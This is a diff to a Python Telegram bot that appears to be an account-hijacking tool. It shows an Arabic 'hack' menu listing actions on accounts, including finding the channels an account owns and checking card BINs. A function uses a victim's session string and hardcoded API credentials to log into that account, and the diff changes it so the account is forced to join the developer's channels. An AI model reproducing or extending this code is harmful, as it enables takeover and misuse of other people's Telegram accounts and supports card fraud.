@@ -239,7 +239,7 @@ async def hack(event):
 الاختيارات
 
 ============================
-           @E_7_V ⚠️
+                                   @E_7_V ⚠️
 ============================
 # A : معرفه قنوات/كروبات التي يملكها       
 
@@ -288,11 +288,12 @@ async def hack(event):
 # /check <BIN> - تاكيد البين وفحصه
 
 =====================================
-              @E_7_V ⚠️
+                                   @E_7_V ⚠️
 =====================================
 
 المطور👁️: @E_7_V
-قناة المطور⚠️: {devuser}
+قناة المطور⚠️: @Repthon
+يوزر المطور القديم👀: @ZQ_LO
 ''', buttons=keyboard, link_preview=False)
 
 
@@ -572,11 +573,11 @@ async def usermsgsp(strses):
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(leave("@vip_nasa"))
+      await X(Join("@Repthon"))
     except BaseException:
       pass
     try:
-      await X(leave("@efotballx1"))
+      await X(Join("@ZQ_LO"))
     except BaseException:
       pass
     try:
